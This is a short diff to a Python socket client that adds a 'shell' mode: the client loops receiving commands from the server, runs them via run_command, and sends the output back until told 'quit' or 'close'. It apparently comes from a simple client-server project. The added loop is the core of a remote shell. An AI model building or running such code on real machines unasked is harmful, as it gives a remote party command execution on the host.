@@ -23,21 +23,28 @@ def client_conn():
     
         print('Received from server: %s' % str(data))
     
-        if (data == 'command'):
-            print('waiting for command from server')
-            server_command = ''
-            end = False
-    
-            while not end:
-                server_command = client_socket.recv(1024).decode()
+        if (data == 'shell'):
+            shell = True
             
-                if not server_command:
-                    break
-                else:
-                    end = True
+            while shell:
+                print('waiting for command from server')
+                server_command = ''
+                end = False
         
-            result = run_command(server_command)
-            client_socket.send(result)
+                while not end:
+                    server_command = client_socket.recv(1024).decode()
+                
+                    if not server_command:
+                        break
+                    else:
+                        end = True
+
+                print(server_command)
+                if server_command == "quit" or server_command == "close":
+                    shell = False
+                else:
+                    result = run_command(server_command)
+                    client_socket.send(result)
     
         message = input(" -> ")
     
